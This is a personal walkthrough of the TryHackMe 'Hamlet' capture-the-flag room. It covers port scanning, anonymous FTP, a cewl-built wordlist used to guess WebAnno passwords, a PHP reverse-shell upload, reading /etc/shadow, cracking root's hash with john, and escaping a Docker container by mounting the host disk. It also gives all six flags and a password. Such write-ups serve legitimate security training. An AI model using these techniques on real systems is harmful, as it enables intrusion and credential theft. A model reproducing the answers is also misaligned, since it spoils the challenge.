<p align="center">July 2, 2025</p>
<h1 align="center">Hamlet</h1>

<p align="center"July 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{421}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A Shakespeare/Hamlet-inspired room in which you will explore an uncommon web application used in linguistic/NLP research.</em>.<br>
It is classified as a medium-level challenge. You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if<br> you are subscribed.
Can be accessed clicking  <a href="https://tryhackme.com/room/hamlet">here</a>.</p>

![image](https://github.com/user-attachments/assets/47779636-9242-4f4b-a9fb-02d07bd75ccc)

<h2>Task 1 . To hack, or not to hack, that is the question.</h2>
<p>Welcome to <code>Hamlet</code>!</p>
<p>This is a fairly straightforward CTF-like room in which you will play with an uncommon web application used in linguistic research. You will also learn a little bit about Docker. While there are CTF elements, there are quite a few "real" problems in here. Feel free to explore!<br>

In the associated GitHub repository, you will find detailed information about this room as well as the learning objectives. That said, I would recommend trying this room as a challenge first.<br>

There's a total of six flags. You don't necessarily have to find them in order. (Flags: THM{#_flag})<br>

Please note that the machine takes a while to boot fully, and some services will only become available after a few minutes.</p>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>What is Michael's password? Hint : You will, most likely, create a wordlist and test against WebAnno.</em><br><a id='1.1'></a>
>> <strong><code>vnsanctified</code></strong><br>
<p></p>

<br>

<h3>Nmap</h3>
<p>
  
- <code>21/ftp/vsftpf,Anonynous</code><br>
- <code>22/ssh</code><br>
- <code>80/http/lighttpd 1.4.45</code><br>
- <code>8000/http/Apache</code><br>
- <code>8080/http-proxy/WebAnno</code></p>

```bash
:~/Hamlet# nmap -sV -p- 10.10.228.214
...
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        lighttpd 1.4.45
501/tcp  open  nagios-nsca Nagios NSCA
8000/tcp open  http        Apache httpd 2.4.48 ((Debian))
8080/tcp open  http-proxy
```

```bash
:~/Hamlet# nmap -sC -sV -sS -v -T4 TargetIP
...
PORT      STATE  SERVICE    VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
|_-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:AttackIP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp    open   http       lighttpd 1.4.45
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd/1.4.45
|_http-title: Hamlet Annotation Project
8000/tcp  open   http       Apache httpd 2.4.48 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html).
8080/tcp  open   http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 500 
|     Content-Type: application/json;charset=UTF-8
|     Date: Fri, 27 Jun 2025 ...
|     Connection: close
|     {"timestamp":1751067797780,"status":500,"error":"Internal Server Error","exception":"org.springframework.security.web.firewall.RequestRejectedException","message":"The request was rejected because the URL contained a potentially malicious String "%2e"","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 27 Jun 2025 ...
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-favicon: Unknown favicon MD5: 0488FACA4C19046B94D07C3EE83CF9D6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
| http-title: WebAnno - Log in 
|_Requested resource was http://ip-xx-xx-xxx-xxx.eu-west-1.compute.internal:8080/login.html
|_http-trane-info: Problem with XML parsing of /evox/about
50000/tcp closed ibm-db2
50001/tcp closed unknown
50002/tcp closed iiimsf
50003/tcp closed unknown
50006/tcp closed unknown
50300/tcp closed unknown
50389/tcp closed unknown
50500/tcp closed unknown
50636/tcp closed unknown
50800/tcp closed unknown
```

<h3>dirsearch</h3>

```bash
:~/Hamlet# dirsearch -u TargetIP -x 403
...
[...] 200 -   64B  - /robots.txt
```

```bash
:~/Hamlet# dirsearch -u TargetIP:8000 -x 403
...
[...] 301 -  318B  - /db  ->  http://TargetIP:8000/db/
[...] 301 -  326B  - /repository  ->  http://TargetIP:8000/repository/
```

```bash
:~/Hamlet# dirsearch -u TargetIP:8080 -x 400,401,403,404,500
...
[...8] 200 -  946B  - /favicon.ico
[...] 200 -    8KB - /login.html
[...] 302 -    0B  - /logout  ->  http://10.10.228.214:8080/login?logout
```

<br>

<h3>FTP</h3>

```bash
:~/Hamlet# ftp TargetIP
Connected to TargetIP.
220 (vsFTPd 3.0.3)
Name (TargetIP:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,228,214,196,204).
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
226 Directory send OK.
ftp> get password-policy.md
local: password-policy.md remote: password-policy.md
227 Entering Passive Mode (10,10,228,214,196,20).
150 Opening BINARY mode data connection for password-policy.md (113 bytes).
226 Transfer complete.
113 bytes received in 0.00 secs (152.4193 kB/s)
ftp> get ufw.status
local: ufw.status remote: ufw.status
227 Entering Passive Mode (10,10,228,214,196,185).
150 Opening BINARY mode data connection for ufw.status (1425 bytes).
226 Transfer complete.
1425 bytes received in 0.00 secs (2.8136 MB/s)
ftp> exit
221 Goodbye.
```

<h3>password-policy.md</h3>

```bash
:~/Hamlet# cat password-policy.md
# Password Policy

## WebAnno

New passwords should be:

- lowercase
- between 12 and 14 characters long
```

<p>ufw.status</p>

```bash
cat ufw.status
Status: active

To                         Action      From
--                         ------      ----
20/tcp                     ALLOW       Anywhere                  
21/tcp                     ALLOW       Anywhere                  
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
501/tcp                    ALLOW       Anywhere                  
8080/tcp                   ALLOW       Anywhere                  
8000/tcp                   ALLOW       Anywhere                  
1603/tcp                   ALLOW       Anywhere                  
1564/tcp                   ALLOW       Anywhere                  
50000:50999/tcp            ALLOW       Anywhere                  
20/tcp (v6)                ALLOW       Anywhere (v6)             
21/tcp (v6)                ALLOW       Anywhere (v6)             
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
501/tcp (v6)               ALLOW       Anywhere (v6)             
8080/tcp (v6)              ALLOW       Anywhere (v6)             
8000/tcp (v6)              ALLOW       Anywhere (v6)             
1603/tcp (v6)              ALLOW       Anywhere (v6)             
1564/tcp (v6)              ALLOW       Anywhere (v6)             
50000:50999/tcp (v6)       ALLOW       Anywhere (v6)   
```

<h3>nc</h3>

<br>

<p>1.3. Flag 2<br>
<code>THM{2_ophelia_s_grave}</code></p>


```bash
nc 10.10.228.214 501
GRAVEDIGGER
What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?
PENTESTER

uen times salt,
Burne out the Sence and Vert
PENTESTER

'th' darkest night,
Sticke
PENTESTER

good Liege,
I hold my dutie, as I hold my Soul
PENTESTER

eeme much vnsinnowed,
And yet to me they are strong.
PENTESTER

ntors head. All this can I
PENTESTER

His forme and
PENTESTER

on to your soule,
That not your trespasse, but my madnesse sp
PENTESTER

ore than 3
PENTESTER
...
Were thicker then it selfe with Brothers blood,
Is there not Raine enough in
PENTESTER
Gallow 
Ham. How does the Queene?
  King. She sounds to see them bleede

   Qu. No, no, the drinke, t
PENTESTER
Gallows
ll sh
PENTESTER
gallows
THM{2_ophelia_s_grave}
```

<br>

<p>1.2. Flag 1<br>
<code>THM{1_most_mechanical_and_dirty_hand}</code></p>

<h3>hamlet.thm/robots.txt</h3>

![image](https://github.com/user-attachments/assets/5d93c935-f088-49e3-8ce8-e0d7e6d0f122)

<h3>hamlet.thm</h3>

![image](https://github.com/user-attachments/assets/8d63b350-c9b3-47f0-86d4-0cd26b4c54e6)

<p>Clicked <code>This</code><br>
Identified <code>See the index.</code>

![image](https://github.com/user-attachments/assets/fb6bbc82-acfe-45b0-85b6-290b2199a6eb)

```bash
***The Project Gutenberg's Etext of Shakespeare's First Folio***
*********************The Tragedie of Hamlet*********************

*****This file should be named 0ws2610.txt or 0ws2610.zip******

Corrected EDITIONS of our etexts get a new NUMBER, 0ws2611.txt
VERSIONS based on separate sources get new LETTER, 0ws2610a.txt
...
When all other email fails. . .try our Executive Director:
Michael S. Hart <hart@pobox.com>
hart@pobox.com forwards to hart@prairienet.org and archive.org
...
o access Project Gutenberg etexts, use any Web browser
to view http://promo.net/pg.  This site lists Etexts by
author and by title, and includes information about how
to get involved with Project Gutenberg.  You could also
download our past Newsletters, or subscribe here.  This
is one of our major sites, please email hart@pobox.com,
for a more complete list of our various sites.

To go directly to the etext collections, use FTP or any
Web browser to visit a Project Gutenberg mirror (mirror
sites are available on 7 continents; mirrors are listed
at http://promo.net/pg).

Mac users, do NOT point and click, typing works better.

Example FTP session:

ftp sunsite.unc.edu
login: anonymous
password: your@login
cd pub/docs/books/gutenberg
cd etext90 through etext99
dir [to see files]
get or mget [to get files. . .set bin for zip files]
GET GUTINDEX.??  [to get a year's listing of books, e.g., GUTINDEX.99]
GET GUTINDEX.ALL [to get a listing of ALL books]
```

<h3>cewl</h3>

```bash
:~# apt install cewl
...
:~# cewl -m 12 -w wordlist.txt --lowercase http://TargetIP/hamlet.txt
```

<br>


<h3>hamlet.thm:8080/login.html</h3>

![image](https://github.com/user-attachments/assets/adfd8940-0054-4b0d-abd7-f28d86b42ef5)

<p>welcome.html</p>

![image](https://github.com/user-attachments/assets/da7fb7d1-41a5-430a-8975-9623c8a1bf08)

<p>./login.html?-1.-loginForm</p>

./login.html?-1.-loginForm">

![image](https://github.com/user-attachments/assets/e823eb6d-6aeb-48fb-9dba-be4f7d71b3a7)


<h3>ghost : vnsanctified</h3>

![image](https://github.com/user-attachments/assets/f14ff84e-8eb0-4470-8130-ea23c3ba76c4)

<p>admin, ghost, ophelia</p>

![image](https://github.com/user-attachments/assets/639a7fa7-7167-48e9-a87f-36b4fd1a988d)

![image](https://github.com/user-attachments/assets/1c585174-93e5-4b6b-8db3-19b3bfa76b72)


![image](https://github.com/user-attachments/assets/644c3ae1-54bb-4a3a-b9db-670573782174)

<br>

<p>changed admin´s and ophelia´s password</p>

![image](https://github.com/user-attachments/assets/52f1a7cc-a34f-40eb-ba42-f8b8593d062a)

![image](https://github.com/user-attachments/assets/e0f26af0-7ef1-4375-a883-db977d93c46c)

![image](https://github.com/user-attachments/assets/c9fcf31e-17d8-4e18-b776-c45830980e33)


![image](https://github.com/user-attachments/assets/b7673009-f33c-449c-b672-deb03d85739a)

<p>Don't forget that the KEQehFDWwuQbMbKW password does not work for WebAnno.</p>

![image](https://github.com/user-attachments/assets/b6d57a76-ab03-4318-baef-0b8363a2fd46)

![image](https://github.com/user-attachments/assets/849a8a1a-f91b-4096-8803-d691b64ef387)

```bash
curl http:/TargetIP:8000/repository/project/0/document/1/source/rev.php
...
```

<br>

<p>1.5. Flag 4<br>
<code>THM{4_the_murder_of_gonzago}</code></p>

```bash
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null


www-data@66505608bd11:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
www-data@66505608bd11:/$ cat /etc/shadow
cat /etc/shadow
root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::
daemon:*:18872:0:99999:7:::
bin:*:18872:0:99999:7:::
sys:*:18872:0:99999:7:::
sync:*:18872:0:99999:7:::
games:*:18872:0:99999:7:::
man:*:18872:0:99999:7:::
lp:*:18872:0:99999:7:::
mail:*:18872:0:99999:7:::
news:*:18872:0:99999:7:::
uucp:*:18872:0:99999:7:::
proxy:*:18872:0:99999:7:::
www-data:*:18872:0:99999:7:::
backup:*:18872:0:99999:7:::
list:*:18872:0:99999:7:::
irc:*:18872:0:99999:7:::
gnats:*:18872:0:99999:7:::
nobody:*:18872:0:99999:7:::
_apt:*:18872:0:99999:7:::
...
www-data@66505608bd11:/stage$ cat flag
cat flag
THM{4_the_murder_of_gonzago}
www-data@66505608bd11:/stage$ 
```

<br>

<p>1.6. Flag 5<br>
<code>THM{5_murder_most_foul}</code></p>

```bash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash
...
murder           (?)
...
Session completed. 
```



```bash
root@66505608bd11:/stage# cd /root
cd /root
root@66505608bd11:~# ls -lah
ls -lah
total 20K
drwx------ 1 root root 4.0K Sep 15  2021 .
drwxr-xr-x 1 root root 4.0K Sep 15  2021 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@66505608bd11:~# cat .flag
cat .flag
THM{5_murder_most_foul}
root@66505608bd11:~# 
```


```bash
oot@66505608bd11:/# cd dev
cd dev
root@66505608bd11:/dev# ls
ls
autofs		  mqueue	      tty18  tty45   ttyS14	userio
btrfs-control	  net		      tty19  tty46   ttyS15	vcs
core		  network_latency     tty2   tty47   ttyS16	vcs1
cpu_dma_latency   network_throughput  tty20  tty48   ttyS17	vcs2
cuse		  null		      tty21  tty49   ttyS18	vcs3
dm-0		  port		      tty22  tty5    ttyS19	vcs4
dri		  ppp		      tty23  tty50   ttyS2	vcs5
ecryptfs	  psaux		      tty24  tty51   ttyS20	vcs6
fb0		  ptmx		      tty25  tty52   ttyS21	vcsa
fd		  pts		      tty26  tty53   ttyS22	vcsa1
full		  random	      tty27  tty54   ttyS23	vcsa2
fuse		  rfkill	      tty28  tty55   ttyS24	vcsa3
hpet		  rtc0		      tty29  tty56   ttyS25	vcsa4
hwrng		  shm		      tty3   tty57   ttyS26	vcsa5
input		  snapshot	      tty30  tty58   ttyS27	vcsa6
kmsg		  snd		      tty31  tty59   ttyS28	vfio
lightnvm	  stderr	      tty32  tty6    ttyS29	vga_arbiter
loop-control	  stdin		      tty33  tty60   ttyS3	vhci
loop0		  stdout	      tty34  tty61   ttyS30	vhost-net
loop1		  tty		      tty35  tty62   ttyS31	vhost-vsock
loop2		  tty0		      tty36  tty63   ttyS4	xen
loop3		  tty1		      tty37  tty7    ttyS5	xvda
loop4		  tty10		      tty38  tty8    ttyS6	xvda1
loop5		  tty11		      tty39  tty9    ttyS7	xvda2
loop6		  tty12		      tty4   ttyS0   ttyS8	xvda3
loop7		  tty13		      tty40  ttyS1   ttyS9	xvdh
mapper		  tty14		      tty41  ttyS10  ttyprintk	zero
mcelog		  tty15		      tty42  ttyS11  uhid
mem		  tty16		      tty43  ttyS12  uinput
memory_bandwidth  tty17		      tty44  ttyS13  urandom
root@66505608bd11:/dev# mkdir /mnt/disk
mkdir /mnt/disk
root@66505608bd11:/dev# mount /dev/dm-0 /mnt/disk
mount /dev/dm-0 /mnt/disk
root@66505608bd11:/dev# ls -la /mnt/disk/
ls -la /mnt/disk/
total 4015224
drwxr-xr-x 24 root root       4096 Sep 15  2021 .
drwxr-xr-x  1 root root       4096 Jun 28 02:12 ..
drwxr-xr-x  2 root root       4096 Sep 15  2021 bin
drwxr-xr-x  2 root root       4096 Sep 15  2021 boot
drwxr-xr-x  2 root root       4096 Sep 15  2021 cdrom
drwxr-xr-x  4 root root       4096 Aug  6  2020 dev
drwxr-xr-x 99 root root       4096 Sep 16  2021 etc
drwxr-xr-x  5 root root       4096 Sep 15  2021 home
lrwxrwxrwx  1 root root         34 Sep 15  2021 initrd.img -> boot/initrd.img-4.15.0-156-generic
lrwxrwxrwx  1 root root         34 Sep 15  2021 initrd.img.old -> boot/initrd.img-4.15.0-156-generic
drwxr-xr-x 23 root root       4096 Sep 15  2021 lib
drwxr-xr-x  2 root root       4096 Aug  6  2020 lib64
drwx------  2 root root      16384 Sep 15  2021 lost+found
drwxr-xr-x  2 root root       4096 Aug  6  2020 media
drwxr-xr-x  3 root root       4096 Sep 15  2021 mnt
drwxr-xr-x  5 root root       4096 Sep 15  2021 opt
drwxr-xr-x  2 root root       4096 Apr 24  2018 proc
drwx------  5 root root       4096 Sep 15  2021 root
drwxr-xr-x 13 root root       4096 Aug  6  2020 run
drwxr-xr-x  2 root root      12288 Sep 15  2021 sbin
drwxr-xr-x  2 root root       4096 Sep 15  2021 snap
drwxr-xr-x  4 root root       4096 Sep 15  2021 srv
-rw-------  1 root root 4111466496 Sep 15  2021 swap.img
drwxr-xr-x  2 root root       4096 Apr 24  2018 sys
drwxrwxrwt  9 root root       4096 Jun 27 23:39 tmp
drwxr-xr-x 10 root root       4096 Aug  6  2020 usr
drwxr-xr-x 14 root root       4096 Sep 15  2021 var
lrwxrwxrwx  1 root root         31 Sep 15  2021 vmlinuz -> boot/vmlinuz-4.15.0-156-generic
lrwxrwxrwx  1 root root         31 Sep 15  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-156-generic
...
```

<br>

<p>1.7. Flag 6<br>
<code>THM{6_though_this_be_madness_yet_there_is_method_in_t}</code></p>

```bash
root@66505608bd11:/mnt/disk/root# ls
ls
flag
root@66505608bd11:/mnt/disk/root# cat flag
cat flag
THM{6_though_this_be_madness_yet_there_is_method_in_t}
root@66505608bd11:/mnt/disk/root# 
```


![image](https://github.com/user-attachments/assets/0aab443b-d943-4c7d-b917-5b752484cc8c)


<br>
<br>
